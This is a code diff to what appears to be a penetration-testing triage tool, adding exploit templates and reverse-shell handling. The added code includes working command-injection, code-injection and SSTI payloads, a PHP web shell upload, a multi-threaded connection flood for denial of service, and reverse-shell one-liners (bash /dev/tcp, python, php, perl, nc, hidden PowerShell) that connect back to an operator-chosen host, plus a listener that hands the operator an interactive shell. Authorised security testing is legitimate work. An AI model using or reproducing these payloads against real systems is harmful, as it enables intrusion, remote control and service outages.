@@ -40,8 +40,18 @@ import re
 import subprocess
 import sys
 import tempfile
+import select
+import threading
 import time
 from typing import Dict, List, Optional, Tuple
+
+try:
+    import fcntl
+    import termios
+    import tty
+    _HAS_PTY = True
+except ImportError:
+    _HAS_PTY = False
 
 TOOL_DIR = os.path.dirname(os.path.abspath(__file__))
 sys.path.insert(0, TOOL_DIR)
@@ -546,7 +556,9 @@ def _build_cve_record(cve_id: str, finding: dict):
         cve_id=cve_id,
         product=m_prod.group(1) if m_prod else "unknown",
         severity=(finding.get("severity") or "HIGH"),
-        cvss=float(m_cvss.group(1)) if m_cvss else 7.0,
+        cvss=float(m_cvss.group(1)) if m_cvss else {
+            "CRITICAL": 9.0, "HIGH": 7.5, "MEDIUM": 5.5, "LOW": 3.5,
+        }.get((finding.get("severity") or "HIGH").upper(), 5.0),
         summary=finding.get("title") or "",
         references=refs,
         epss=epss,
@@ -612,17 +624,22 @@ def _run_script_operator(script: str, timeout: int = 60) -> Tuple[bool, str]:
             stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
             text=True, env=restricted_env,
         )
-        lines = []
+        lines: list = []
         assert proc.stdout is not None
-        for line in proc.stdout:
-            print("    " + line, end="")
-            lines.append(line.rstrip())
 
+        def _drain() -> None:
+            for line in proc.stdout:  # type: ignore[union-attr]
+                print("    " + line, end="")
+                lines.append(line.rstrip())
+
+        reader = threading.Thread(target=_drain, daemon=True)
+        reader.start()
         try:
             proc.wait(timeout=timeout)
         except subprocess.TimeoutExpired:
             proc.kill()
             print(f"\n  [!] Script timed out after {timeout}s")
+        reader.join(timeout=5)
 
         for line in lines:
             if line.startswith("RESULT:"):
@@ -719,73 +736,108 @@ def re_verify_interactive(module_name: str, finding: dict,
                           decisions: Dict[str, dict]) -> None:
     """Interactive re-verify: show PoC, let operator edit & run, record manual verdict.
 
-    This mode is for assessing real criticality — the operator can modify the
-    script to extract specific data, test privilege levels, or craft a payload
-    that proves RCE/exfiltration impact beyond a simple boolean confirmation.
-    """
-    ctx = _get_plan(finding, module_name)
-    if ctx is None:
-        return
-    cve_id, host, port, plan = ctx
+    Works for every CWE family — RCE, DoS, reverse shell, SSRF, SQLi, etc. When
+    the exploit planner has no plan or only a banner_match strategy, a CWE-appropriate
+    PoC template is generated so the operator always reaches the editor and can run
+    something real against the target.
 
-    strategy = plan.test_strategy
-    print(f"\n  [INTERACTIVE] {cve_id} @ {host}:{port}  │  strategy: {strategy}")
-    print(f"  CVSS: {plan.cve.cvss:.1f}  │  EPSS: {plan.cve.epss:.2f}  │  "
-          f"CWE: {plan.cve.cwe or 'unknown'}")
-    print(f"  {plan.cve.summary[:120]}")
+    After confirmed RCE/shell: offers to launch a reverse shell listener and hand
+    off a raw interactive PTY session to the operator.
+    """
+    loc = finding.get("location") or ""
+    if not loc:
+        print("  [!] No target location in finding — cannot re-verify.")
+        return
+
+    cve_id = _cve_id_from_finding(finding)
+    cwe    = finding.get("cwe") or ""
+    host, port = _parse_host_port(loc)
+
+    # ── Try to get an exploit plan (best-effort — never required) ──────────────
+    plan          = None
+    plan_strategy = None
+    plan_protocol = "http"
+    plan_cvss     = 0.0
+    plan_epss     = 0.0
+    plan_summary  = finding.get("title") or ""
+
+    if cve_id:
+        record = _build_cve_record(cve_id, finding)
+        if record:
+            plan_cvss    = record.cvss
+            plan_epss    = record.epss
+            plan_summary = record.summary[:120]
+            try:
+                from exploits import exploit_planner
+                plans = exploit_planner.prioritize(
+                    [record], host, port, max_plans=1,
+                    has_llm=False, have_local_access=False,
+                )
+                if plans:
+                    plan          = plans[0]
+                    plan_strategy = plan.test_strategy
+                    plan_protocol = getattr(plan, "protocol", "http")
+            except ImportError:
+                pass
+
+    cve_label = cve_id or "(no CVE ID)"
+    print(f"\n  [INTERACTIVE] {cve_label} @ {host}:{port}  │  CWE: {cwe or 'unknown'}")
+    if plan_cvss:
+        print(f"  CVSS: {plan_cvss:.1f}  │  EPSS: {plan_epss:.2f}  │  "
+              f"strategy: {plan_strategy or 'manual'}")
+    if plan_summary:
+        print(f"  {plan_summary}")
     print()
 
-    # For banner_match / nuclei: we can't meaningfully show/edit a "script"
-    if strategy in ("banner_match", "nuclei_template"):
-        print(f"  Strategy '{strategy}' does not use an editable script.")
-        print("  Use [ra] auto mode to run detection, or [a] to accept based on existing evidence.")
-        return
+    # ── Get a PoC script ───────────────────────────────────────────────────────
+    # Priority: (1) builtin template from exploit_generator,
+    #           (2) CWE-appropriate template (always available),
+    # banner_match / nuclei_template strategies have no editable script — skip to (2).
+    script: Optional[str] = None
+    if plan and plan_strategy not in ("banner_match", "nuclei_template"):
+        try:
+            from exploits import exploit_generator
+            script = exploit_generator._select_builtin_template(plan)  # noqa: SLF001
+        except ImportError:
+            pass
 
-    # Generate the PoC script
-    try:
-        from exploits import exploit_generator
-    except ImportError as exc:
-        print(f"  [!] Cannot import exploit_generator: {exc}", file=sys.stderr)
-        return
-
-    script = exploit_generator._select_builtin_template(plan)  # noqa: SLF001
+    used_cwe_template = not script
     if not script:
-        print("  [!] No built-in PoC template available for this CVE/strategy.")
-        print("  You can write a custom script — press [e] to open a blank script in your editor.")
-        ans = _ask("  Open editor with blank script? [y/N]: ").lower()
-        if ans not in ("y", "yes"):
-            return
-        script = (
-            f"# Interactive PoC for {cve_id} — {plan.cve.summary[:80]}\n"
-            f"# Target: {host}:{port}  Protocol: {plan.protocol}\n"
-            f"# Edit this script, then print:  RESULT:true:<evidence>  or  RESULT:false:\n"
-            f"import socket\n\n"
-            f"HOST, PORT = {host!r}, {port}\n\n"
-            f"# TODO: implement detection\n"
-            f"print('RESULT:false:not implemented')\n"
+        script = _cwe_poc_template(
+            cve_id or "unknown", cwe, host, port,
+            plan_summary, plan_protocol,
         )
+        if plan_strategy in ("banner_match", "nuclei_template"):
+            print(_cc(_DIM, f"  Strategy '{plan_strategy}' has no editable script — "
+                            f"using {cwe or 'generic'} PoC template instead."))
+        elif not plan:
+            print(_cc(_DIM, f"  No exploit plan available — using {cwe or 'generic'} "
+                            f"PoC template."))
+        else:
+            print(_cc(_DIM, f"  No built-in template — using {cwe or 'generic'} PoC template."))
 
-    # Display the script
+    # ── Display the script ────────────────────────────────────────────────────
     print(_cc(_BOLD, "  ── PoC Script ──────────────────────────────────────────────────────"))
     for lineno, line in enumerate(script.splitlines(), 1):
         print(f"  {lineno:>3}  {line}")
     print(_cc(_BOLD, "  ────────────────────────────────────────────────────────────────────"))
     print()
 
-    # Offer to edit
+    # ── Offer edit ────────────────────────────────────────────────────────────
     ans = _ask("  Edit script in $EDITOR before running? [y/N]: ").lower()
     if ans in ("y", "yes"):
         script = _open_editor(script)
         print()
         print(_cc(_YEL, "  [!] Running operator-modified script (no sandbox resource caps)."))
 
-    # Run with full output streamed to terminal
+    # ── Run ───────────────────────────────────────────────────────────────────
+    timeout = 30 if cwe in _DOS_CWES else 90
     print(_cc(_BOLD, "  ── Script output ───────────────────────────────────────────────────"))
-    _, auto_evidence = _run_script_operator(script, timeout=90)
+    _, auto_evidence = _run_script_operator(script, timeout=timeout)
     print(_cc(_BOLD, "  ────────────────────────────────────────────────────────────────────"))
     print()
 
-    # Operator verdict
+    # ── Verdict ───────────────────────────────────────────────────────────────
     print("  What did you observe?")
     print("    [c]onfirmed  — vulnerability is real, impact assessed")
     print("    [p]artial    — partially confirmed or ambiguous")
@@ -825,10 +877,37 @@ def re_verify_interactive(module_name: str, finding: dict,
     print(_cc(verdict_colors[verdict], f"  ✔ Recorded: {verdict}" + (f" — {notes}" if notes else "")))
     print()
 
-    if verdict in ("confirmed", "partial"):
+    if verdict not in ("confirmed", "partial"):
+        return
+
+    # ── Post-confirmation: RCE/shell → offer reverse shell handoff ─────────────
+    if cwe in _RCE_CWES:
+        print(_cc(_YEL, "  ◈ RCE confirmed — choose next step:"))
+        print("    [rs]   start reverse shell listener — catch interactive shell from target")
+        print("    [pe]   open post-exploitation toolkit")
+        print("    [s]    skip, return to triage")
+        while True:
+            nxt = _ask("  rce> ").lower().strip()
+            if nxt in ("rs", "shell", "revshell", "reverse"):
+                lhost, lport = _ask_lhost_lport()
+                if lhost:
+                    payloads = _reverse_shell_payloads(lhost, lport)
+                    print(_cc(_BOLD, "\n  Run one of these on the target to connect back:"))
+                    for tech, cmd in payloads.items():
+                        print(f"    {_cc(_CYN, f'{tech:<12}')} {cmd}")
+                    print()
+                    _reverse_shell_session(lhost, lport)
+                break
+            if nxt in ("pe", "post", "p", ""):
+                run_post_exploitation(cve_id or "unknown", host, port, cwe)
+                break
+            if nxt in ("s", "skip"):
+                break
+            print("  Choose rs / pe / s")
+    else:
         ans = _ask("  Open post-exploitation toolkit for this foothold? [Y/n]: ").lower()
         if ans in ("", "y", "yes"):
-            run_post_exploitation(cve_id, host, port, finding.get("cwe") or "")
+            run_post_exploitation(cve_id or "unknown", host, port, cwe)
 
 
 # ─────────────────────────────── post-exploitation toolkit ───────────────────
@@ -847,7 +926,8 @@ _CWE_FOLLOW_UP: Dict[str, List[str]] = {
     # Auth bypass / unauth access — enumerate what is now reachable
     "CWE-287":  ["k8s-enum", "db-auth", "db-cred-access", "proto-auth", "access-prover"],
     "CWE-306":  ["k8s-enum", "db-auth", "unauth-service-probe", "access-prover"],
-    "CWE-798":  ["db-auth", "ssh-auth", "proto-auth", "db-cred-access"],
+    # hard-coded / weak credentials and auth bypass both warrant cred-access + spray
+    "CWE-798":  ["db-auth", "ssh-auth", "proto-auth", "db-cred-access", "default-creds"],
     "CWE-522":  ["db-auth", "ssh-auth", "proto-auth", "default-creds"],
     # Path traversal / file read — find secrets, then pivot
     "CWE-22":   ["linux-privesc", "unauth-service-probe", "port-probe"],
@@ -861,8 +941,6 @@ _CWE_FOLLOW_UP: Dict[str, List[str]] = {
     "CWE-250":  ["linux-privesc", "container-escape-detector", "k8s-probe"],
     "CWE-269":  ["linux-privesc", "k8s-enum", "access-prover"],
     "CWE-732":  ["linux-privesc", "unauth-service-probe"],
-    # Hard-coded / weak credentials — spray discovered creds broadly
-    "CWE-798":  ["db-auth", "ssh-auth", "proto-auth", "default-creds"],
     # Supply chain / injected code
     "CWE-494":  ["linux-privesc", "container-escape-detector"],
     "CWE-506":  ["linux-privesc", "container-escape-detector"],
@@ -873,10 +951,302 @@ _CWE_FOLLOW_UP: Dict[str, List[str]] = {
     # HTTP-layer issues — expand web surface
     "CWE-444":  ["unauth-service-probe", "k8s-probe"],
     "CWE-345":  ["linux-privesc", "unauth-service-probe"],
+    # DoS / resource exhaustion — verify service recovery, probe siblings
+    "CWE-400":  ["fuzz-probe", "port-probe", "unauth-service-probe"],
+    "CWE-770":  ["fuzz-probe", "port-probe"],
+    "CWE-834":  ["fuzz-probe"],
 }
 _DEFAULT_FOLLOW_UP = ["linux-privesc", "unauth-service-probe", "port-probe", "default-creds"]
 
+# CWE families for interactive-mode routing
+_RCE_CWES   = {"CWE-77", "CWE-78", "CWE-94", "CWE-434", "CWE-502", "CWE-787", "CWE-1336"}
+_DOS_CWES   = {"CWE-400", "CWE-770", "CWE-834"}
+_SHELL_CWES = {"CWE-78", "CWE-94", "CWE-502", "CWE-1336"}  # most likely to yield a shell
+
 _INTENSITY_ORDER = ["detective", "active", "intrusive", "proof", "fuzz"]
+
+
+def _cwe_poc_template(cve_id: str, cwe: str, host: str, port: int,
+                      summary: str, protocol: str = "http") -> str:
+    """Return a CWE-appropriate starter PoC script the operator can edit before running."""
+    head = (
+        f"# Interactive PoC — {cve_id}  ({cwe})\n"
+        f"# Target:   {host!r}:{port}  protocol: {protocol}\n"
+        f"# Summary:  {summary[:100]}\n"
+        f"# Print:  RESULT:true:<evidence>   or   RESULT:false:\n\n"
+    )
+    if cwe in ("CWE-78", "CWE-77"):
+        return head + (
+            f"import urllib.request, urllib.parse\n\n"
+            f"HOST, PORT = {host!r}, {port}\n"
+            f"CMD = 'id'  # OS command to inject\n\n"
+            f"# Inject via HTTP query parameter — adapt URL / parameter name\n"
+            f"payload = urllib.parse.quote(f'; {{CMD}} #')\n"
+            f"url = f'http://{{HOST}}:{{PORT}}/path?param={{payload}}'\n"
+            f"try:\n"
+            f"    resp = urllib.request.urlopen(url, timeout=10).read().decode(errors='replace')\n"
+            f"    print('Response:', resp[:500])\n"
+            f"    if 'uid=' in resp or 'root' in resp:\n"
+            f"        print(f'RESULT:true:cmd_injection: {{resp[:200]}}')\n"
+            f"    else:\n"
+            f"        print('RESULT:false:no command output')\n"
+            f"except Exception as e:\n"
+            f"    print(f'RESULT:false:{{e}}')\n"
+        )
+    if cwe == "CWE-94":
+        return head + (
+            f"import urllib.request, urllib.parse\n\n"
+            f"HOST, PORT = {host!r}, {port}\n"
+            f"EXPR = '__import__(\"os\").popen(\"id\").read()'  # code to inject\n\n"
+            f"payload = urllib.parse.quote(EXPR)\n"
+            f"url = f'http://{{HOST}}:{{PORT}}/?eval={{payload}}'\n"
+            f"try:\n"
+            f"    resp = urllib.request.urlopen(url, timeout=10).read().decode(errors='replace')\n"
+            f"    print('Response:', resp[:500])\n"
+            f"    if 'uid=' in resp:\n"
+            f"        print(f'RESULT:true:RCE confirmed: {{resp[:200]}}')\n"
+            f"    else:\n"
+            f"        print('RESULT:false:no RCE output')\n"
+            f"except Exception as e:\n"
+            f"    print(f'RESULT:false:{{e}}')\n"
+        )
+    if cwe == "CWE-1336":
+        return head + (
+            f"import urllib.request, urllib.parse\n\n"
+            f"HOST, PORT = {host!r}, {port}\n"
+            f"# Jinja2 SSTI probe: {{{{7*7}}}} → should return 49\n"
+            f"probe = urllib.parse.quote(r'{{{{7*7}}}}')\n"
+            f"url = f'http://{{HOST}}:{{PORT}}/?name={{probe}}'\n"
+            f"try:\n"
+            f"    resp = urllib.request.urlopen(url, timeout=10).read().decode(errors='replace')\n"
+            f"    print('Response:', resp[:500])\n"
+            f"    if '49' in resp:\n"
+            f"        print(f'RESULT:true:SSTI confirmed: {{resp[:200]}}')\n"
+            f"    else:\n"
+            f"        print('RESULT:false:SSTI probe not reflected')\n"
+            f"except Exception as e:\n"
+            f"    print(f'RESULT:false:{{e}}')\n"
+        )
+    if cwe == "CWE-502":
+        return head + (
+            f"import socket\n\n"
+            f"HOST, PORT = {host!r}, {port}\n"
+            f"# Java serialization magic bytes — replace with your gadget chain payload\n"
+            f"PAYLOAD = b'\\xac\\xed\\x00\\x05'\n\n"
+            f"try:\n"
+            f"    s = socket.create_connection((HOST, PORT), timeout=10)\n"
+            f"    s.sendall(PAYLOAD)\n"
+            f"    resp = s.recv(4096)\n"
+            f"    s.close()\n"
+            f"    print('Response bytes:', resp[:100].hex())\n"
+            f"    print('RESULT:false:manual analysis required — check if server crashed or responded abnormally')\n"
+            f"except Exception as e:\n"
+            f"    print(f'RESULT:false:{{e}}')\n"
+        )
+    if cwe in ("CWE-400", "CWE-770", "CWE-834"):
+        return head + (
+            f"import socket, time, threading\n\n"
+            f"HOST, PORT = {host!r}, {port}\n"
+            f"THREADS  = 20   # concurrent connections\n"
+            f"DURATION = 15   # seconds\n\n"
+            f"sent = [0]\n\n"
+            f"def flood():\n"
+            f"    end = time.time() + DURATION\n"
+            f"    while time.time() < end:\n"
+            f"        try:\n"
+            f"            s = socket.create_connection((HOST, PORT), timeout=2)\n"
+            f"            s.sendall(b'GET / HTTP/1.1\\r\\nHost: ' + HOST.encode() + b'\\r\\n\\r\\n')\n"
+            f"            s.recv(1024)\n"
+            f"            s.close()\n"
+            f"            sent[0] += 1\n"
+            f"        except OSError:\n"
+            f"            pass\n\n"
+            f"workers = [threading.Thread(target=flood, daemon=True) for _ in range(THREADS)]\n"
+            f"for w in workers: w.start()\n"
+            f"for w in workers: w.join()\n"
+            f"print(f'Sent {{sent[0]}} requests in {{DURATION}}s across {{THREADS}} threads')\n"
+            f"print('RESULT:true:DoS stress complete — verify service was impacted')\n"
+        )
+    if cwe == "CWE-434":
+        return head + (
+            f"import urllib.request, urllib.parse\n\n"
+            f"HOST, PORT = {host!r}, {port}\n"
+            f"# Upload a PHP web shell — adapt the upload endpoint and field name\n"
+            f"UPLOAD_URL = f'http://{{HOST}}:{{PORT}}/upload'\n"
+            f"WEBSHELL   = b'<?php system($_GET[\"cmd\"]); ?>'\n\n"
+            f"import http.client, email.mime.multipart\n"
+            f"boundary = b'----TriageBoundary'\n"
+            f"body = (\n"
+            f"    b'--' + boundary + b'\\r\\n'\n"
+            f"    b'Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\\r\\n'\n"
+            f"    b'Content-Type: application/octet-stream\\r\\n\\r\\n'\n"
+            f"    + WEBSHELL + b'\\r\\n'\n"
+            f"    b'--' + boundary + b'--\\r\\n'\n"
+            f")\n"
+            f"req = urllib.request.Request(\n"
+            f"    UPLOAD_URL, data=body,\n"
+            f"    headers={{'Content-Type': f'multipart/form-data; boundary={{boundary.decode()}}'}},\n"
+            f")\n"
+            f"try:\n"
+            f"    resp = urllib.request.urlopen(req, timeout=10).read().decode(errors='replace')\n"
+            f"    print('Upload response:', resp[:300])\n"
+            f"    # Try to execute the shell\n"
+            f"    shell_url = f'http://{{HOST}}:{{PORT}}/uploads/shell.php?cmd=id'\n"
+            f"    out = urllib.request.urlopen(shell_url, timeout=10).read().decode(errors='replace')\n"
+            f"    print('Shell output:', out[:300])\n"
+            f"    if 'uid=' in out:\n"
+            f"        print(f'RESULT:true:webshell RCE: {{out[:200]}}')\n"
+            f"    else:\n"
+            f"        print('RESULT:false:upload may have succeeded but shell not reached')\n"
+            f"except Exception as e:\n"
+            f"    print(f'RESULT:false:{{e}}')\n"
+        )
+    # Generic / unknown CWE
+    return head + (
+        f"import socket\n\n"
+        f"HOST, PORT = {host!r}, {port}\n\n"
+        f"# Implement your PoC here.\n"
+        f"# Print RESULT:true:<evidence>  or  RESULT:false: when done.\n"
+        f"try:\n"
+        f"    s = socket.create_connection((HOST, PORT), timeout=10)\n"
+        f"    s.sendall(b'HEAD / HTTP/1.0\\r\\n\\r\\n')\n"
+        f"    banner = s.recv(4096).decode(errors='replace')\n"
+        f"    s.close()\n"
+        f"    print('Banner:', banner[:300])\n"
+        f"    print('RESULT:false:manual analysis required')\n"
+        f"except Exception as e:\n"
+        f"    print(f'RESULT:false:{{e}}')\n"
+    )
+
+
+def _reverse_shell_payloads(lhost: str, lport: int) -> Dict[str, str]:
+    """Return {technique: one-liner} for common reverse shell methods."""
+    return {
+        "bash":       f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",
+        "python3":    (f"python3 -c \"import os,socket,subprocess;"
+                       f"s=socket.socket();s.connect(('{lhost}',{lport}));"
+                       f"[os.dup2(s.fileno(),i) for i in(0,1,2)];"
+                       f"subprocess.call(['/bin/sh','-i'])\""),
+        "php":        (f"php -r '$s=fsockopen(\"{lhost}\",{lport});"
+                       f"$p=popen(\"/bin/sh -i\",\"r\");"
+                       f"while(!feof($p)){{stream_copy_to_stream($p,$s);}}'"),
+        "perl":       (f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
+                       f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
+                       f"connect(S,sockaddr_in($p,inet_aton($i)));"
+                       f"open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
+                       f"exec(\"/bin/sh -i\");'"),
+        "nc":         f"nc -e /bin/sh {lhost} {lport}",
+        "nc_mkfifo":  (f"rm -f /tmp/f; mkfifo /tmp/f; "
+                       f"cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"),
+        "powershell": (f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
+                       f"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
+                       f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
+                       f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
+                       f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
+                       f"$r=(iex $d 2>&1|Out-String)+'PS '+(pwd).Path+'> ';"
+                       f"$e=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($e,0,$e.Length)}}"),
+    }
+
+
+def _ask_lhost_lport() -> Tuple[str, int]:
+    """Prompt operator for reverse shell LHOST / LPORT (honours $LHOST / $LPORT env)."""
+    lhost_def = os.environ.get("LHOST", "")
+    lport_def = int(os.environ.get("LPORT", "4444"))
+    lhost_in  = _ask(f"  Your IP (LHOST) [{lhost_def or 'required'}]: ").strip()
+    lhost = lhost_in or lhost_def
+    if not lhost:
+        print("  [!] LHOST required — set $LHOST or enter manually.")
+        return "", 0
+    lport_in = _ask(f"  Listening port (LPORT) [{lport_def}]: ").strip()
+    try:
+        lport = int(lport_in) if lport_in else lport_def
+    except ValueError:
+        lport = lport_def
+    return lhost, lport
+
+
+def _raw_socket_session(conn) -> None:
+    """Full-duplex raw PTY session over a connected socket (for reverse shells).
+
+    Sets the terminal to raw mode so arrow keys, Ctrl-C, and readline all work
+    inside the remote shell. Press Ctrl-] (ASCII 29) to detach cleanly.
+    Requires POSIX termios — falls back to the line-based _tcp_shell loop otherwise.
+    """
+    if not _HAS_PTY:
+        print("  [!] termios not available — falling back to line mode.")
+        return
+
+    import sys as _sys
+    fd = _sys.stdin.fileno()
+    old_settings = termios.tcgetattr(fd)
+    print(_cc(_DIM, "  [raw] Ctrl-] to detach  Ctrl-C sends SIGINT to remote"))
+    try:
+        tty.setraw(fd)
+        conn.setblocking(False)
+        while True:
+            r, _, _ = select.select([_sys.stdin, conn], [], [], 0.05)
+            for src in r:
+                if src is _sys.stdin:
+                    data = os.read(fd, 1024)
+                    if not data:
+                        return
+                    if b'\x1d' in data:  # Ctrl-] = detach
+                        return
+                    try:
+                        conn.sendall(data)
+                    except OSError:
+                        return
+                else:
+                    try:
+                        data = conn.recv(4096)
+                    except (OSError, BlockingIOError):
+                        continue
+                    if not data:
+                        return
+                    _sys.stdout.buffer.write(data)
+                    _sys.stdout.buffer.flush()
+    except KeyboardInterrupt:
+        pass
+    finally:
+        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
+        try:
+            conn.close()
+        except OSError:
+            pass
+        sys.stdout.buffer.write(b"\n")
+        sys.stdout.buffer.flush()
+
+
+def _reverse_shell_session(lhost: str, lport: int) -> None:
+    """Bind a TCP listener and hand off a raw interactive session on connect."""
+    import socket as _sock
+    print()
+    print(_cc(_BOLD, f"  ── Reverse Shell Listener ─── {lhost}:{lport} ──────────────────────"))
+    print(_cc(_DIM,  "  Waiting up to 60s for incoming connection …"))
+    print()
+
+    srv = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
+    srv.setsockopt(_sock.SOL_SOCKET, _sock.SO_REUSEADDR, 1)
+    try:
+        srv.bind((lhost, lport))
+    except OSError as exc:
+        print(f"  [!] Cannot bind {lhost}:{lport} — {exc}")
+        return
+    srv.listen(1)
+    srv.settimeout(60)
+    try:
+        conn, addr = srv.accept()
+    except OSError:
+        print("  [!] No connection within 60s — listener closed.")
+        return
+    finally:
+        srv.close()
+
+    print(_cc(_GRN, f"  [✔] Shell from {addr[0]}:{addr[1]}"))
+    print()
+    _raw_socket_session(conn)
+    print(_cc(_DIM, "  ── session closed ──────────────────────────────────────────────────"))
+    print()
 
 
 def _make_target(host: str, port: int):
@@ -944,7 +1314,7 @@ def _tcp_shell(host: str, port: int) -> None:
     """
     import socket as _sock
     print(_cc(_BOLD, f"\n  ── Raw TCP session → {host}:{port} ─────────────────────────────────"))
-    print(_cc(_DIM, "  Type lines to send (empty line = receive only, 'quit' = disconnect)"))
+    print(_cc(_DIM, "  Type lines to send (empty = receive only, 'raw' = PTY mode, 'quit' = disconnect)"))
     print()
     try:
         conn = _sock.create_connection((host, port), timeout=10)
@@ -963,6 +1333,7 @@ def _tcp_shell(host: str, port: int) -> None:
         except OSError:
             pass
 
+        _consecutive_recv_timeouts = 0
         while True:
             try:
                 line = _ask("  → ").rstrip("\n")
@@ -970,6 +1341,11 @@ def _tcp_shell(host: str, port: int) -> None:
                 break
             if line.lower() in ("quit", "exit", "q"):
                 break
+            if line.lower() in ("raw", ".raw"):
+                # Switch to full-duplex PTY mode (Ctrl-] to detach)
+                print(_cc(_DIM, "  Switching to raw PTY mode …"))
+                _raw_socket_session(conn)
+                return  # conn is closed by _raw_socket_session
             if line:
                 try:
                     conn.sendall((line + "\r\n").encode())
@@ -988,8 +1364,12 @@ def _tcp_shell(host: str, port: int) -> None:
                         break
                 for resp_line in buf.decode("utf-8", errors="replace").splitlines():
                     print(_cc(_CYN, f"  ← {resp_line}"))
+                _consecutive_recv_timeouts = 0
             except OSError:
-                pass
+                _consecutive_recv_timeouts += 1
+                if _consecutive_recv_timeouts >= 3:
+                    print(_cc(_DIM, "  [!] No response — connection may be idle or dead. Type 'quit' to disconnect."))
+                    _consecutive_recv_timeouts = 0
     finally:
         conn.close()
         print(_cc(_DIM, "  ── session closed ──────────────────────────────────────────────────"))
@@ -1033,7 +1413,8 @@ def run_post_exploitation(cve_id: str, host: str, port: int, cwe: str) -> None:
     print("    [mod]   run any module by name  (e.g.: mod k8s-enum)")
     print("    [list]  list all hostport-compatible modules")
     print("    [c]     write / edit a custom follow-up PoC script")
-    print("    [t]     open raw TCP session for manual exploration")
+    print("    [t]     open raw TCP session (banner grab / line-mode)")
+    print("    [rs]    start reverse shell listener — catch interactive shell from target")
     print("    [done]  return to triage menu")
     print()
 
@@ -1091,12 +1472,24 @@ def run_post_exploitation(cve_id: str, host: str, port: int, cwe: str) -> None:
             print()
             continue
 
-        # t — raw TCP session
+        # t — raw TCP session (line mode)
         if choice in ("t", "tcp"):
             _tcp_shell(host, port)
             continue
 
-        print("  Unknown command — try a number, 'mod <name>', 'list', 'c', 't', or 'done'")
+        # rs — reverse shell listener → raw PTY handoff
+        if choice in ("rs", "revshell", "shell", "reverse"):
+            lhost, lport = _ask_lhost_lport()
+            if lhost:
+                payloads = _reverse_shell_payloads(lhost, lport)
+                print(_cc(_BOLD, "\n  Run one of these on the target to connect back:"))
+                for tech, cmd in payloads.items():
+                    print(f"    {_cc(_CYN, f'{tech:<12}')} {cmd}")
+                print()
+                _reverse_shell_session(lhost, lport)
+            continue
+
+        print("  Unknown command — try a number, 'mod <name>', 'list', 'c', 't', 'rs', or 'done'")
 
 
 # ──────────────────────────────────────── triage session ─────────────────────
@@ -1131,6 +1524,8 @@ def _ask(prompt: str) -> str:
 
 
 def run_triage(pairs: List[Tuple[str, dict]], report_path: str, auto_reverify: bool) -> None:
+    global _Decisions
+    _Decisions = {}
     total = len(pairs)
     i = 0
     while i < total:
